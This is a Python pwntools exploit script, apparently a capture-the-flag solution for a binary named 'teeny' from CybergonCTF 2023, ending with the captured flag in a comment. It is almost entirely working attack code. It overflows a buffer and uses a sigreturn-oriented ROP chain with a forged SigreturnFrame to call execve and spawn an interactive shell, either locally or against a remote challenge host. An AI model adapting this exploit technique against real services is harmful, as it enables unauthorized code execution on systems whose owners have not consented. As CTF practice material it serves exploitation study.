#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./teeny_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("cybergon2023.webhop.me", 5004)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = cyclic_find('caaa')
	bash = 0x40238
	syscall = 0x40015

	frame = SigreturnFrame()
	frame.rax = 0x3B
	frame.rdi = bash
	frame.rsi = 0
	frame.rdx = 0
	frame.rip = syscall

	rop = ROP(exe)
	rop(rax=0x0F)
	rop.raw(syscall)


	payload = b''.join([
		b'A' * offset,
		rop.chain(),
		bytes(frame),
	])

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()


# CybergonCTF{5UD0_R0P_ch41n}
